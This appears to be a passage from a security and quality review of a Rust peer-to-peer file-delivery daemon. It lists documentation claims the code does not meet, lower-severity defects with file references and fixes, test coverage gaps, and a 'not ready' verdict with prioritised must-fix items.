| `DESIGN.md:17-20` | relays "may be configured", assist hole punching, "can be self-hosted" | `transport.rs:365`; `presets.rs:62-79`; `endpoint.rs:190` — no relay code path exists |
| `DESIGN.md:217-222` | "optional blind relays", "a user … turns relays off" | same — there is nothing to turn off |
| `DESIGN.md:13-14` | tickets carry "a relay URL when used" | `transport.rs:376-378, 407-411` — never populated under `Minimal` |
| `DESIGN.md:20-22`, `README.md:92` | TCP is a "fallback" | `transport.rs:153` binds `Ipv4Addr::LOCALHOST` — loopback only, cannot reach another machine |
| `DESIGN.md:164` | "the security argument for stripping [secrets] is weak" because the transport is E2E encrypted | true for iroh; false for `--transport tcp`, which is cleartext framing (`transport.rs:52-58, 90-99`) |
| `DESIGN.md:254` | non-goal: "Executing anything. Not recipes" | `cadabra/src/lib.rs:899-904` |
| `README.md:66-77` | two-device demo, no reachability caveat | across NAT this cannot connect |
| `SPEC.md:600-603` | revocation "floods to all trusted peers" | H2 — no flooding exists |
| `SPEC.md:593-594` | other full peers accept a guest via bind certificate | H2 — `accept_bind_cert` has no callers |

**On the downgrade question, the answer is good:** there is no downgrade path. Addresses are transport-tagged and signed into the ticket (`auth.rs:639-694`), `IrohTransport::add_peer_address` requires JSON and `TcpTransport::add_peer_address` requires a `tcp://` prefix (`transport.rs:225-237, 412-417`), and the transport is chosen by a local `--transport` flag, never negotiated. A peer or MITM cannot force cleartext. **What they can do** is nothing — the risk here is purely that the docs promise reachability and relay privacy properties the binary does not have.

Also: the daemon never awaits `Endpoint::online()` before minting tickets (`lib.rs:456-464, 788-804`), so a ticket minted immediately after bind can carry an empty address set. That is a plausible flake source for `two_process.rs`.

**Fix.** Either wire relays and discovery (a `--relay` / `--discovery` flag switching to `presets::N0` or `N0DisableRelay`, with the privacy trade-off documented since `N0` publishes to `dns.iroh.link`), or rewrite `DESIGN.md:13-22, 217-222` and `README.md:92` to state: direct addresses only, same-LAN or manually-routed, TCP fallback is loopback-only. Await `online()` before minting a ticket.

### L2. One ed25519 key across iroh TLS, the TCP challenge, and every application record — INFO

The Abra ed25519 secret is handed to `iroh::SecretKey` (`transport.rs:366`) and also signs `pair-ticket`, `enroll`, `enroll-bind`, `bind-cert`, `revoke`, `control`, `ack`, `snapshot`, and `tcp-transport` records. **The binding is sound**: `Daemon::new` (`lib.rs:90-92`) refuses to start if `transport.local_peer_id() != node.peer_id()`, `IrohTransport::local_peer_id` reads the endpoint id (`transport.rs:404-406`), and `wrap()` takes the remote peer id from iroh's TLS-authenticated `remote_id()` (`:386`). Transport identity and Abra peer id cannot diverge, and `check_hello` (`auth.rs:1078-1083`), `accept_pair_request` (`:286-290`), `bind_enrollment` (`:413-417`) and `confirm_pair` (`:341-345`) all re-bind the claimed peer id to the transport identity. Application signatures are domain-separated by `abra-sig-v1\0<domain>\0` (`identity.rs:41-47`) and TLS 1.3 `CertificateVerify` has its own distinct prefix, so cross-protocol confusion is not exploitable today. The residual risk is structural: any future signing site added without a domain prefix is immediately cross-protocol with TLS. Worth a comment at the key definition and a note in `SPEC.md`.

### L3. `pair-request` is persisted and shown to the operator before its peer id is validated

`crates/abra-net/src/delivery.rs:926-932` writes `net/pending-pairs/<request.peer_id>` and the operator sees it through `abra pair pending` (`lib.rs:474-477`). The check that `request.peer_id == connection.peer_id()` happens only later, in `accept_pair_request` (`auth.rs:286-290`), after the wait. An unauthenticated peer can therefore inject arbitrary peer ids and names into the operator's confirmation UI and create unbounded files. The mismatch check ultimately prevents the wrong peer being trusted, so this is confusion and litter, not a trust bypass. Validate before persisting; bound the directory.

### L4. `cadabra --no-default-features` does not compile

`Daemon::tcp` (`crates/cadabra/src/lib.rs:111-117`) is not `#[cfg(feature = "tcp")]`-gated although `TcpTransport`'s import at `:13-14` is. Building `cadabra` with neither transport feature fails. Gate the method.

### L5. Dead and drifting code

`Outbox::retry_fresh` (`outbox.rs:216-231`) has no production caller — after 20 attempts an entry sits in `Failed` with no CLI to revive it. `MAX_OBJECT_STREAMS` (`delivery.rs:24`) is unused. `TrustStore::authorize_offer`/`authorize_ack`/`authorize_fetch` (`auth.rs:508-574`) are called only from `net_spec.rs`; the daemon path re-implements the same policy inline at `delivery.rs:437-459`, so the tested code and the shipped code are different code and can drift. `DeliveryNode::pending_pair_requests` / `approved_pair_requests` (`delivery.rs:197-198`) are never read — the durable directory is used instead. Consolidate onto the tested entry points.

### L6. Expired pair tickets honoured for a further 60 s

`auth.rs:301` — `if now > CLOCK_SKEW_MS + parse_time(&ticket.expires_at)?`. The acceptor grants an extra minute of skew on a locally-minted, locally-clocked, 10-minute credential. Compounds with H3 (a stale `now` after the 600 s wait). Drop the skew allowance for locally-issued tickets.

---

## Test adequacy (priority 6)

`cargo test --workspace` → 62 passed, 0 failed, across `abra-core` (29 unit + 12 spec), `abra-net` (5 unit + 11 spec), `abra-cli` (2 smoke + 1 two-process), `cadabra` (2 e2e). The two-process test does exercise the real binaries over the real default iroh transport, which is genuinely valuable.

**The three tests named-missing in stage 3 are still missing — all three.**
- **Bidirectional send:** `cadabra/tests/e2e.rs:63` sends A→B twice (a capsule snapshot and a link handoff) and never B→A.
- **Status-during-receive:** absent. No test observes `status`/`outbox` state while a transfer is mid-flight.
- **Interactive pairing over UDS:** absent. `e2e.rs:29` covers only the `--yes` path (`auto_confirm_pairs = true`). The `awaiting_pair_confirm` → `pair-confirm` path with the 600 s wait loop (`delivery.rs:933-967`, `auth.rs:318-348`) has **no test at all** — and that is precisely the path carrying M7's unrecoverable crash window.

**The stage-4 gaps are worse than the stage-3 leftovers.** Sol's report that guest/grant e2e coverage was "not completed" is accurate, and the untested regions are exactly where the defects are:

- **Standing grants and recipes: zero tests.** Not one test touches `policy-grant`, `apply_receive_grants`, or `stop-recipes`. This is the first code-execution surface in the product and the P2 headline. A single test that delivers **twice** under one grant would have caught H4; a single test asserting a recipe actually runs would have caught H5's unreachability.
- **Guest lifecycle through the daemon: zero tests.** `net_spec.rs:271-292` exercises `TrustStore::authorize_offer` directly, and `scope_expiry_revocation_and_guest_to_guest_are_enforced` works at the `DeliveryNode` level — but nothing drives `enroll-mint → join → send → receive → revoke` through `Daemon::handle`. H6 (guests cannot send at all) survives only because of this gap; my ~40-line probe found it immediately.
- **No concurrency test anywhere.** H1, M6 and M12 are all lost-update bugs. A test with two writers against one root would expose every one of them.
- **Untested entirely:** `watch`, `events`, `control` (send and receive), `lease-status`, `lease-take`, `renew_leases`, `ps`, `stop-recipes`, SIGTERM shutdown, `--token` guest startup, the `abra://join` URL form, and outbox `cancel` during flight.
- **`allow_agent_send = true` appears only in `net_spec.rs:413`** — a test asserting behaviour that the daemon can never reach. That is a coverage illusion: the guest send path is "tested" and shipped broken.

Minimum additions I would gate a v1 on: (1) two deliveries under one grant, asserting both land; (2) guest e2e through the daemon covering in-scope send, out-of-scope send, out-of-scope receive, and post-revocation refusal; (3) a revoke-during-open-connection test (H1); (4) interactive pairing over UDS including the drop-before-confirm case; (5) bidirectional send; (6) a `watch` test asserting well-formed NDJSON under concurrent event writers.

---

## Verdict

**Not ready.** The primitive should not yet be the stable base for an external showcase app built only on the public CLI/daemon surface.

The cryptographic core is in good shape — the iroh identity binding is correct and cannot diverge (L2), the record formats are canonical and domain-separated, scope enforcement on *receive* genuinely works (I verified an out-of-scope kind being refused and an in-scope one accepted), guest-to-guest is blocked in both directions, have-disclosure to guests is correctly suppressed (`delivery.rs:794-801`), the bootstrap allowlist holds, and there is no transport downgrade path. Stage 4's protocol design is sound.

What is not ready is the layer an app would actually sit on. Of the four stage-4 headline features, **three do not work as shipped**: standing grants fire once and then wedge permanently (H4); recipe execution — the entire P2 deliverable — is unreachable dead code that would be unconstrained RCE if reached (H5); guests cannot send at all (H6). And the one control that bounds a guest, revocation, can be silently undone by ordinary daemon traffic (H1) and does not propagate between devices despite `SPEC.md` saying it floods (H2). An app author reading `SPEC.md`, `DESIGN.md` and `docs/API.md` would build against relays, mesh-wide revocation, guest send, and repeatable auto-accept — four guarantees the binary does not provide.

The honest framing: stage 4 wired a lot of plumbing end to end and the wire protocol deserves confidence, but the daemon integration was not exercised, and the missing tests and the missing behaviour are the same set. Every defect I confirmed by running code sits in a region with no test.

### Top 3 must-fix

1. **H1 — one owner for trust state.** Share a single `TrustStore` behind the daemon mutex instead of a fresh `DeliveryNode::open` per connection and per control request. This single change fixes the proven revocation loss, plus M6's ticket single-use, token-binding and control-nonce replay failures. Nothing else on this list matters if a revoked guest can un-revoke itself. Ship with a regression test that revokes while a connection is open.

2. **H4 + H5 — make standing grants work, and decide about recipes.** Materialize into a per-snapshot subdirectory and make `apply_receive_grants` failure-isolating so one stuck delivery cannot wedge every grant. Then either delete recipe execution and honour `DESIGN.md:254`, or route Full-scope manifests to the grant evaluator *and* constrain it properly — `argv[0]` canonicalized inside the materialized root, `env_clear()` plus an allowlist, argv pinned per grant, process groups with rlimits. Shipping unreachable RCE code is the worst of both options: no feature and a loaded gun.

3. **H6 + M1 + M2 — make the guest role real.** Wire `allow_agent_send` so a `send: true` scope means something (or remove the scope and the flag). Make capsule scope bind capsule-less deliveries so `--capsule <id>` is not silently advisory for all inbox traffic. Gate the local control API on `LocalRole::Full` so a guest daemon cannot mint enrollment tokens and pairing tickets.

**Immediately after, before any external author reads them:** correct `DESIGN.md:13-22, 217-222, 254`, `README.md:92`, and `SPEC.md:593-603` (L1, H2). The docs currently promise relays, NAT traversal, a usable TCP fallback, mesh-wide revocation, mesh-wide guest acceptance, and no code execution. None of those six is true of `ae68fa9`.

Also queue for the same cycle: H3 (frozen `now`), H7 (accept-loop stall), M5 (event-log corruption behind `abra watch`, which a showcase app will lean on hardest), and the six tests listed above.
